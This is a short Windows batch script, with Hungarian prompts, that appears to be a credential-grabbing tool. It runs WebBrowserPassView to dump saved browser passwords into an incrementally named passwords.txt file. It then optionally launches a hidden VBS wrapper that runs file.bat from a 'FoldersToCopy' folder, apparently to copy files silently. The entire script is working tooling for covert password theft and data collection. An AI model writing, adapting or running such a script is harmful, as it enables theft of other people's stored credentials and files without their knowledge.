@echo off
setlocal enabledelayedexpansion

set "baseFileName=passwords"
set "extension=.txt"
set "fileName=%baseFileName%%extension%"

rem Check if the file already exists
set "counter=1"
:checkFile
if exist "%fileName%" (
    set "fileName=%baseFileName%_%counter%%extension%"
    set /a counter+=1
    goto checkFile
)

set /p choice=WebBrowserPassView? (Y/N) :

if /i "%choice%"=="Y" (
    start WebBrowserPassView.exe /stext "%fileName%"
) else (
    echo A parancs lemondva.
    goto end
)

rem Prompt for additional action
set /p action=FoldersToCopy? (Y/N): 

if /i "%action%"=="Y" (
    rem Run the script with full path
    cd /d "%~dp0FoldersToCopy"
    wscript.exe invisible.vbs file.bat
) else (
    echo A parancs lemondva.
)

:end
endlocal
exit /b
